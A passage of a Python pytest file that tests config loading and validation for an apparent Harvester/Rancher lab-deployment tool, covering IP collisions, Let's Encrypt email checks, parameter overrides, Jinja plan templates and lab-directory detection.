        "vms": {"harvester1": {"ip": "192.168.122.11", "user": "rancher"}},
    }
    with pytest.raises(ValueError, match="collides"):
        config.validate_config(cfg)


def test_rancher_ip_mismatch_rejected():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "network": {"vip": "192.168.122.10", "rancher_ip": "192.168.122.9"},
        "vms": {"rancher": {"ip": "192.168.122.99", "user": "root"}},
    }
    with pytest.raises(ValueError, match="rancher_ip"):
        config.validate_config(cfg)


def test_letsencrypt_unresolved_email_rejected():
    """Regression: an unresolved ??key in rancher_tls.email isn't in the credentials{}
    loop's fail-closed check, so it used to sail through as a literal string all the
    way to Let's Encrypt's ACME server (which rejects it: "contact email contains a
    question mark") — only surfacing after the rancher phase burned 10+ minutes."""
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "rancher_tls": {"source": "letsEncrypt", "email": "??rancher_letsencrypt_email"},
    }
    with pytest.raises(ValueError, match="rancher_tls.email"):
        config.validate_config(cfg)


@pytest.mark.parametrize("bad_email", ["", "admin@example.com", "someone@sub.example.com"])
def test_letsencrypt_placeholder_email_rejected(bad_email):
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "rancher_tls": {"source": "letsEncrypt", "email": bad_email},
    }
    with pytest.raises(ValueError, match="real address"):
        config.validate_config(cfg)


def test_letsencrypt_real_email_accepted():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "rancher_tls": {"source": "letsEncrypt", "email": "andres@suse.com"},
    }
    config.validate_config(cfg)  # must not raise


def test_default_config_is_self_consistent():
    """The shipped defaults must pass their own network validation."""
    cfg = config.load_config("/nonexistent/plan.yaml")
    cfg["credentials"] = {"harvester_os_password": "Secret123"}
    config.validate_config(cfg)  # must not raise


def test_param_override_dotted_path_with_type_coercion(tmp_path):
    plan = _write_plan(tmp_path, {})
    cfg = config.load_config(
        plan,
        params=("resources.harvester.memory_mib=20480", "deployment_target=instruqt"),
    )
    assert cfg["resources"]["harvester"]["memory_mib"] == 20480  # int, not str
    assert cfg["deployment_target"] == "instruqt"


def test_param_invalid_format_rejected(tmp_path):
    plan = _write_plan(tmp_path, {})
    with pytest.raises(config.ConfigError, match="KEY=VALUE"):
        config.load_config(plan, params=("justakey",))


def test_paramfile_deep_merges_like_tfvars(tmp_path):
    plan = _write_plan(tmp_path, {"network": {"vip": "10.1.1.1"}})
    pf = tmp_path / "params.yaml"
    pf.write_text(yaml.dump({"network": {"vip": "10.2.2.2"}, "name": "from-paramfile"}))
    cfg = config.load_config(plan, paramfile=pf)
    assert cfg["network"]["vip"] == "10.2.2.2"   # paramfile beats plan
    assert cfg["name"] == "from-paramfile"
    assert cfg["network"]["rancher_ip"] == "192.168.122.9"  # merge, not replace


def test_param_beats_paramfile(tmp_path):
    plan = _write_plan(tmp_path, {})
    pf = tmp_path / "params.yaml"
    pf.write_text(yaml.dump({"network": {"vip": "10.2.2.2"}}))
    cfg = config.load_config(plan, paramfile=pf, params=("network.vip=10.3.3.3",))
    assert cfg["network"]["vip"] == "10.3.3.3"


def test_jinja_plan_with_parameters_block(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text(
        "parameters:\n"
        "  memory: 4096\n"
        "  domain: lab.example\n"
        "\n"
        "resources:\n"
        "  harvester:\n"
        "    memory_mib: {{ memory }}\n"
        "network:\n"
        "  dns_domain: \"{{ domain }}\"\n"
    )
    cfg = config.load_config(plan)
    assert cfg["resources"]["harvester"]["memory_mib"] == 4096
    assert cfg["network"]["dns_domain"] == "lab.example"
    assert "parameters" not in cfg


def test_jinja_parameter_overridden_by_cli(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text(
        "parameters:\n  memory: 4096\n\n"
        "resources:\n  harvester:\n    memory_mib: {{ memory }}\n"
    )
    cfg = config.load_config(plan, params=("memory=8192",))
    assert cfg["resources"]["harvester"]["memory_mib"] == 8192


def test_jinja_undefined_parameter_is_clear_error(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("network:\n  vip: \"{{ nope }}\"\n")
    with pytest.raises(config.ConfigError, match="undefined template parameter"):
        config.load_config(plan)


def test_malformed_yaml_is_clean_error(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("network:\n\tvip: broken-by-tab\n")
    with pytest.raises(config.ConfigError, match="invalid YAML"):
        config.load_config(plan)


def test_resource_sanity_rejected():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "resources": {"harvester": {"memory_mib": -4, "vcpu": 8, "disk_gb": 270}},
    }
    with pytest.raises(config.ConfigError, match="positive integer"):
        config.validate_config(cfg)


def test_bad_libvirt_disk_cache_rejected():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "libvirt": {"disk_cache": "turbo"},
    }
    with pytest.raises(config.ConfigError, match="disk_cache"):
        config.validate_config(cfg)


def test_find_ansible_root_prefers_explicit(tmp_path):
    explicit = tmp_path / "custom"
    (explicit / "ansible").mkdir(parents=True)
    (explicit / "ansible" / "playbook.yml").write_text("---\n")
    cfg = {"ansible": {"path": str(explicit)}}
    assert config.find_ansible_root(cfg) == explicit


def test_find_ansible_root_falls_back_to_bundled():
    cfg = {"ansible": {"path": None}}
    root = config.find_ansible_root(cfg)
    assert root is not None
    assert (root / "ansible" / "playbook.yml").exists()


def test_cwd_lab_dir_picks_up_local_definition(tmp_path, monkeypatch):
    """Regression: running from inside a lab dir (no --config-dir) must still use
    that dir's definition.yaml, not silently substitute the bundled 3-node one.

    Previously, find_lab_dir()/config_dir auto-detection only fired when
    plan_path.exists() was False (i.e. it had to be located by walking up from
    elsewhere). Running directly inside a lab dir found rodeo-plan.yaml via a
    plain relative path, skipping that block entirely — config_dir stayed None,
    default_cfg() fell back to the bundled 3-node definition, and preflight's
    resource math silently assumed 3 Harvester nodes instead of the real 2."""
    import shutil

    example = Path(__file__).parent.parent / "rodeo" / "data" / "examples" / "harvester-2n"
    shutil.copy(example / "rodeo-plan.yaml", tmp_path / "rodeo-plan.yaml")
    shutil.copy(example / "definition.yaml", tmp_path / "definition.yaml")

    monkeypatch.chdir(tmp_path)
    cfg = config.load_config("rodeo-plan.yaml")
    harvester_nodes = [n for n in cfg["vms"] if n.startswith("harvester")]
    assert len(harvester_nodes) == 2
